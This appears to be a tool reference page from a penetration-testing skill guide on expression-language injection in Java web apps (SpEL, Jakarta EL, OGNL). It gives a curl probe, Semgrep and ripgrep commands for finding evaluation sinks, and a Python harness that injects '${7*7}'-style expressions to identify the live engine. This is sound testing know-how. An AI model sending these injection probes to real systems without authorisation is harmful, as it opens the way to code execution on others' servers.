# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`code-injection-and-eval-expression-language`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -G 'https://target.example/greeting' --data-urlencode 'name=#{7*7}'` | Submit the SpEL delimiter probe and check whether 49 returns in the rendered output | Cross-platform |
| `Semgrep` | `semgrep --config p/java --severity ERROR .` | Flag SpelExpressionParser and OGNL evaluation sinks fed by request data in Java source | Cross-platform |
| `ripgrep` | `rg -n -e parseExpression -e StandardEvaluationContext -e "Ognl.getValue" -e "MVEL.eval" -t java` | Inventory EL parser call sites and their evaluation contexts before runtime probing | Cross-platform |

## Minimal Script Shape

A delimiter-dialect harness: it submits the same arithmetic in SpEL, EL, and OGNL delimiters and reports which dialect returned the computed 49, identifying the active engine non-destructively.

```python
import urllib.parse
import urllib.request

BASE = "https://target.example/greeting"

def render(name):
    url = BASE + "?" + urllib.parse.urlencode({"name": name})
    with urllib.request.urlopen(url, timeout=10) as r:
        return r.read().decode("utf-8", "replace")

probes = {"jakarta_el": "${7*7}", "spel": "#{7*7}", "ognl": "%{7*7}"}
active = {name: ("49" in render(expr)) for name, expr in probes.items()}
# A dialect that yields 49 identifies the live expression engine
print({"dialects": active,
       "expression_language_active": any(active.values())})
```
